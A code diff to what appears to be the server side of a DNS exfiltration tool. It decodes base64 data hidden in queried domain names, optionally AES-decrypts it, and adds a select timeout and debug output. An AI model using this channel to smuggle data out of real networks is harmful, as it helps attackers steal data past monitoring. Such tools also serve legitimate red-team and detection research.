@@ -29,7 +29,6 @@ class Server():
         self.hostname = socket.gethostname()
         self.timeout = timeout
         self.sockets = []
-        self.last = {}
         self.tcps = {}
 
         try:
@@ -57,7 +56,7 @@ class Server():
         print(f"[Info] Server is running!")
         while True:
             try:
-                readable, writable, exceptional = select.select(self.sockets, [], self.sockets)
+                readable, writable, exceptional = select.select(self.sockets, [], [], self.timeout)
                 now = time.time()
                 for sock in readable:
                     if sock.type == socket.SOCK_DGRAM:
@@ -69,14 +68,14 @@ class Server():
                         else:
                             self.process_tcp(sock)
 
-                closed = []
-                for sock in self.last:
-                    if sock not in self.last and now-self.last[sock] > self.timeout:
-                        sock.close()
-                        closed += [sock]
+                # closed = []
+                # for sock in self.last:
+                #     if sock not in self.last and now-self.last[sock] > self.timeout:
+                #         sock.close()
+                #         closed += [sock]
 
-                for dead in closed:
-                    del self.last[dead]
+                # for dead in closed:
+                #     del self.last[dead]
 
                 for sock in exceptional:
                     self.sockets.remove(sock)
@@ -131,9 +130,10 @@ class Server():
 
     def dns_resolve(self, query):
         request = dns.DNSRecord.parse(query)
+        reply = request.reply()
+        
         domain = request.q.get_qname()
         qtype =  request.q.qtype
-        
         data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
         
         if (len(request.questions) > 1):
@@ -147,6 +147,13 @@ class Server():
             else:
                 enc_key = enc_key.decode()
                 data = exf.aes_decrypt(data, enc_key)
+            # reply.add_question(request.questions[1])
+
+        if DEBUG:
+            print_with_time("***", f"Original data length {len(data)} bytes")
+            print_with_time("***", f"{data[:80]}")
+
+        data = base64.b64encode(data)
 
         core_domain = deepcopy(domain)
         core_domain.label = domain.label[-2:]
@@ -169,7 +176,6 @@ class Server():
             elif (qtype == dns.QTYPE.NS):
                 data = [dns.NS(data)]
 
-        reply = request.reply()
         for rd in data:
             reply.add_answer(dns.RR(str(domain), rtype=qtype, rdata=rd))
         
